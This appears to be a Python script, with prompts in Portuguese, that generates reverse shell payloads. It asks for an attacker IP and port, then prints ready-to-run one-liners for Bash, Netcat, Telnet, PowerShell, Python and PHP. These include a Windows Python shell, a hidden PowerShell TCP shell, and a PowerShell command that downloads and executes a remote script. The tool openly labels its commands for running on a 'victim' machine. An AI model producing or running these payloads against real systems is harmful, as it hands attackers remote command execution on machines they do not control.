def gerar_rev():
    """
    Gera uma reverse shell com a tecnologia escolhida
    """
    print("""
    \nReverse shells disponíveis:
            
    - Bash
    - Netcat
    - OpenSSL
    - PHP
    - Powershell
    - Python
    - Telnet\n
    """)
    
    opcoes = ['bash', 'shell', 'powershell', 'ps', 'python', 'py', 'php', 'telnet', 'nc', 'netcat', \
            'ncat']
    opcao = input("Qual reverse shell você deseja?  ")
    opcao = opcao.lower()
    if opcao not in opcoes:
        print("\n\nOpção inválida.")
    elif opcao == 'py' or opcao == 'python':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        print("\n\nEscolha a de preferência:")
        print(f"""
    -----------------------------------------------------------------------------------------------
    1° python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\", {porta}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

    ------------------------------------------------------------------------------------------------
    2° python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}", {porta}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
    
    ------------------------------------------------------------------------------------------------
    3° WINDOWS python3:
    python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{porta}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"

""")
    elif opcao == 'bash' or opcao == 'shell':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        print("\n\nEscolha a de preferência:")
        print(f"""
    -----------------------------------------------------------------------------------------------
    1° bash -i >& /dev/tcp/{ip}/{porta} 0>&1'

    ------------------------------------------------------------------------------------------------
    2° /bin/bash -l > /dev/tcp/{ip}/{porta} 0<&1 2>&1
    
    ------------------------------------------------------------------------------------------------
    3° 0<&196;exec 196<>/dev/tcp/{ip}/{porta}; sh <&196 >&196 2>&196

""")
    elif opcao == 'netcat' or opcao == 'ncat' or opcao == 'nc':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        print("\n\nEscolha a de preferência:")
        print(f"""
    -----------------------------------------------------------------------------------------------
    1° rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {porta} >/tmp/f

    -----------------------------------------------------------------------------------------------
    2° rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {porta} >/tmp/f

    -----------------------------------------------------------------------------------------------
    3° ncat {ip} {porta} -e /bin/bash

    -----------------------------------------------------------------------------------------------
    4° nc -c bash {ip} {porta}

    -----------------------------------------------------------------------------------------------
    5° nc -e /bin/sh {ip} {porta}


""")
    elif opcao == 'telnet':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        porta2 = input("Digite outra porta de escuta:  ")
        print(f"""
              
        Escute em duas portas:
        nc -lvp {porta}
        nc -lvp {porta2}

        Executar na máquina da vítima:
        telnet {ip} {porta} | /bin/sh | telnet {ip} {porta2}

""")
    elif opcao == 'powershell' or opcao == 'ps':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        print("\n\nEscolha a de preferência:")
        print(f"""
    -----------------------------------------------------------------------------------------------
    1° powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{porta});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = \\(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

    ------------------------------------------------------------------------------------------------
    2° powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')


""")
    elif opcao == 'php':
        ip = input("Digite seu IP:  ")
        porta = input("Digite a porta de escuta:  ")
        print("\n\nEscolha a de preferência:")
        print(f"""
    -----------------------------------------------------------------------------------------------
    1° php -r '$sock=fsockopen("{ip}",{porta});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

    -----------------------------------------------------------------------------------------------
    2° php -r '$sock=fsockopen("{ip}",{porta});exec("/bin/sh -i <&3 >&3 2>&3");'

    -----------------------------------------------------------------------------------------------
    3° php -r '$sock=fsockopen("{ip}",{porta});`/bin/sh -i <&3 >&3 2>&3`;'
              
    -----------------------------------------------------------------------------------------------
    4° php -r '$sock=fsockopen("{ip}",{porta});popen("/bin/sh -i <&3 >&3 2>&3", "r");'

""")

